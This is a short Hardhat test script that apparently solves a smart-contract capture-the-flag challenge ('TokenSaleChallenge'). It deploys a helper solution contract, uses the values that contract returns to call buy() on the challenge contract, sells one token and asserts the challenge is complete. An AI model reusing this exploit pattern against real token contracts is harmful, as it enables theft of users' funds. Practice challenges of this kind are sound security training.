const { expect } = require("chai");
const { ethers } = require("hardhat");

const CHALLENGE_ADDRESS = "0x30708EF05245717e4C785B5838d711576DdB3928";

before(async () => {
  accounts = await ethers.getSigners();
  eoa = accounts[0];
  const chFactory = await ethers.getContractFactory("TokenSaleChallenge");
  contract = await chFactory.attach(CHALLENGE_ADDRESS);
});

it("TokenSale", async function () {
  const solFactory = await ethers.getContractFactory(
    "TokenSaleChallengeSolution"
  );
  solContract = await solFactory.deploy();
  console.log("deploying");
  await solContract.deployed();
  console.log("sol contract deployed");
  const result = await solContract.test();
  const tx = await contract.buy(result[0], { value: result[1], gasLimit: 3e6 });
  console.log("buy tx intitiated");
  await tx.wait();
  console.log("buy completed");

  const tx2 = await contract.sell(1, { gasLimit: 3e6 });
  console.log("sell tx intitiated");
  await tx2.wait();
  console.log("sell completed");
  var isComplete = await contract.isComplete();
  expect(isComplete).to.be.true;
});
